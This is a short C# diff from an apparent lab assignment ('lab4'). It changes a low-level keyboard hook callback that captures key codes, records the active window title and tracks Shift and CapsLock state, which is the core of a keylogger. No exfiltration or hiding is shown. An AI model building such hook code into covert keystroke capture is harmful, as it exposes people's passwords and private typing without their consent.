@@ -33,16 +33,11 @@ namespace lab4
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            bool isKeyUp = false;
+            bool isShift = false;
             int vkCode = Marshal.ReadInt32(lParam);
             if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || (wParam == (IntPtr)WM_KEYUP && ((Keys)vkCode == Keys.Shift 
                 || ((Keys)vkCode) == Keys.LShiftKey || ((Keys)vkCode) == Keys.RShiftKey))))
             {
-                if(wParam == (IntPtr)WM_KEYUP)
-                {
-                    isKeyUp = true;
-                }
-
                 if (windowsTitle != GetActiveWindowTitle())
                 {
                     windowsTitle = GetActiveWindowTitle();
@@ -59,6 +54,11 @@ namespace lab4
                     {
                         shift = false;
                     }
+                    isShift = true;
+                }
+                else
+                {
+                    isShift = false;
                 }
                 if(shift == true && (Keys)vkCode == Keys.CapsLock)
                 {
@@ -109,7 +109,7 @@ namespace lab4
                 else
                 {
                     ShowWindowsTitle();
-                    if (!isKeyUp)
+                    if (!isShift)
                     {
                         string outputString = ((Keys)vkCode).ToString();
                         if (isBig == false)
